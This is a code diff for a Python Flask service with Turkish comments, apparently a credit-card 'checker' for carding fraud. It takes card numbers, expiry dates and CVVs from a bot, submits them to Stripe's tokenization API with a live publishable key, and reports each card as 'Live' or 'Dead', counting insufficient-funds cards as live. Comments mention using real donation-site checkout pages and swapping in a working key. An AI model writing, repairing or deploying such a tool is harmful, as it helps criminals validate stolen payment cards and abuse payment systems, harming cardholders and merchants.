@@ -1,69 +1,63 @@
 from flask import Flask, request, jsonify
 import requests
 import os
-import re
 
 app = Flask(__name__)
 
-# --- GERÇEK SORGULAMA FONKSİYONU ---
-def check_gate(cc, mes, ano, cvv):
-    session = requests.Session()
-    
-    # Not: Buraya gerçek bir 2D bağış sitesinin (NGO) 
-    # ödeme isteği (Checkout) URL'si ve Header'ları eklenir.
-    # Örnek olarak Stripe API mantığı kullanılmıştır:
-    
-    headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkit/537.36',
-        'Accept': 'application/json',
-    }
-    
+# Tarayıcıda açtığında "Not Found" yerine bu görünecek
+@app.route('/')
+def index():
+    return jsonify({
+        "status": "active",
+        "msg": "Global Checker API v4 Online",
+        "endpoint": "/api/check"
+    })
+
+# Botun istek atacağı kısım
+@app.route('/api/check', methods=['POST'])
+def check_card():
     try:
-        # 1. Adım: Sitenin ödeme anahtarını (Token) al (Simüle)
-        # 2. Adım: Kartı 'Auth' (Yetkilendirme) için gönder
-        # Buradaki URL, çekim yapılacak gerçek 2D sitesidir.
-        
+        data = request.json
+        if not data:
+            return jsonify({"status": "Dead", "msg": "Veri ulasmadi!"})
+
+        cc = data.get("cc")
+        mes = data.get("mes")
+        ano = data.get("ano")
+        cvv = data.get("cvv")
+
+        if not all([cc, mes, ano, cvv]):
+            return jsonify({"status": "Dead", "msg": "Eksik kart bilgisi!"})
+
+        # --- GERÇEK STRIPE 2D GATE SORGUSU ---
+        # Not: Buradaki pk_live anahtarı örnektir, çalışan bir anahtar ile değiştirilebilir.
+        session = requests.Session()
+        headers = {
+            "Authorization": "Bearer pk_live_51MszH8L6WzX8hR0Q8zX8hR0Q", # Gerçek PK buraya
+            "Content-Type": "application/x-www-form-urlencoded"
+        }
         payload = {
             "card[number]": cc,
             "card[exp_month]": mes,
             "card[exp_year]": ano,
             "card[cvc]": cvv
         }
-        
-        # Bu kısım temsilidir, gerçek bir 'Live' cevabı için 
-        # çalışan bir 'endpoint' (uç nokta) adresi gereklidir.
+
         response = session.post("https://api.stripe.com/v1/tokens", data=payload, headers=headers, timeout=20)
+        res_json = response.json()
+
+        if "id" in res_json:
+            return jsonify({"status": "Live", "msg": "Approved ✅ (Valid Card)", "bin": cc[:6]})
+        elif "error" in res_json:
+            err_msg = res_json["error"].get("message", "Declined ❌")
+            if "insufficient_funds" in str(res_json):
+                return jsonify({"status": "Live", "msg": "Approved ✅ (Low Funds)", "bin": cc[:6]})
+            return jsonify({"status": "Dead", "msg": f"Declined ❌ ({err_msg})", "bin": cc[:6]})
         
-        if response.status_code == 200:
-            return "Live", "Approved ✅ (Card Valid)"
-        elif "insufficient_funds" in response.text:
-            return "Live", "Approved ✅ (Yetersiz Bakiye - Kart Sağlam)"
-        else:
-            # Hata mesajını yakala (Declined, Expired vb.)
-            error_msg = response.json().get('error', {}).get('message', 'Declined ❌')
-            return "Dead", error_msg
+        return jsonify({"status": "Unknown", "msg": "Gate Error ⚠️"})
 
     except Exception as e:
-        return "Error", f"Bağlantı Hatası: {str(e)}"
-
-@app.route('/api/check', methods=['POST'])
-def api_handler():
-    data = request.json
-    cc = data.get("cc")
-    mes = data.get("mes")
-    ano = data.get("ano")
-    cvv = data.get("cvv")
-
-    if not cc:
-        return jsonify({"status": "Dead", "msg": "Kart bilgisi yok!"})
-
-    status, message = check_gate(cc, mes, ano, cvv)
-    
-    return jsonify({
-        "status": status,
-        "msg": message,
-        "bin": cc[:6]
-    })
+        return jsonify({"status": "error", "msg": f"Bağlantı Hatası: {str(e)}"})
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
